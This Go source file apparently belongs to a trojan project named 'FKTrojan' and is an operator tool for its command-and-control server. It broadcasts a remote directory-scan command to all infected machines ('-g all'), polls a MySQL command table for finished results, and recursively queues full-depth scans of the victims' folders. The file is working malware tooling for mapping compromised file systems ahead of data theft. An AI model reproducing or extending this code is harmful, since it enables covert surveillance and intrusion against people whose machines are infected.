package main

import (
	"FKTrojan/common"
	"FKTrojan/server"
	"database/sql"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"time"

	"strings"

	_ "github.com/go-sql-driver/mysql"
)

func isIDDone(id int) (done bool, path string, err error) {
	DB, err := sql.Open("mysql", server.MySQLUser+":"+server.MySQLPass+"@"+server.MySQLHost+"/"+server.MySQLName)
	if err != nil {
		log.Fatal("sql.Open error %v", err)
	}
	defer DB.Close()
	// 检查服务器是否开启
	err = DB.Ping()
	if err != nil {
		log.Fatal("sql.Ping error %v", err)
	}
	var status int
	var file_path string
	DB.QueryRow("SELECT status,file_path from command where id = ?", id).Scan(&status, &file_path)
	if status == 2 {
		return true, file_path, nil
	}
	return false, "", nil
}
func addOne(dir string, depth uint) ([]int, error) {
	pwd := common.CurrentBinaryDir()

	exe := filepath.Join(pwd, "command_tools.exe")

	//./command_tools.exe -g all -c '2x6|D:\bin\scan_dir.exe|-dir|d:/|-depth|2'

	addCommand := fmt.Sprintf("%s -g all -c \"2x6|%s|-dir|%s|-depth|%d\"", exe, filepath.Join(pwd, "scan_dir.exe"), dir, depth)
	fmt.Printf("add command %s\n", addCommand)
	common.RunExe(addCommand)
	//fmt.Printf("o:%s e:%s err:%v\n", o, e, err)
	recordByte, err := ioutil.ReadFile(filepath.Join(pwd, "insert_id.txt"))
	if err != nil {
		return nil, err
	}
	var ids []int
	err = json.Unmarshal(recordByte, &ids)
	if err != nil {
		return nil, err
	}
	return ids, nil
}
func addAll(path string) {
	recordByte, err := ioutil.ReadFile(path)
	if err != nil {
		return
	}
	var items []common.Item
	err = json.Unmarshal(recordByte, &items)
	if err != nil {
		return
	}
	//fmt.Printf("%|v\n", items)
	for _, item := range items {
		if item.ItemType == common.FILE_ITEM {
			continue
		}
		if 2 == strings.Count(item.FullPath, "/") {
			addOne(item.FullPath, common.DEPTH_ALL)
		}
	}
}
func main() {
	if len(os.Args) < 2 {
		fmt.Printf("root path need")
		os.Exit(1)
	}

	root := os.Args[1]

	ids, err := addOne(root, 2)

	if err != nil {
		fmt.Printf("addOne error %v", err)
		os.Exit(1)
	}
	fmt.Printf("ids is %v\n", ids)

	for _, id := range ids {
		for true {
			done, path, _ := isIDDone(id)
			if done {
				fmt.Println(path)
				addAll(path)
				break
			}
			time.Sleep(time.Millisecond)
		}
	}
}
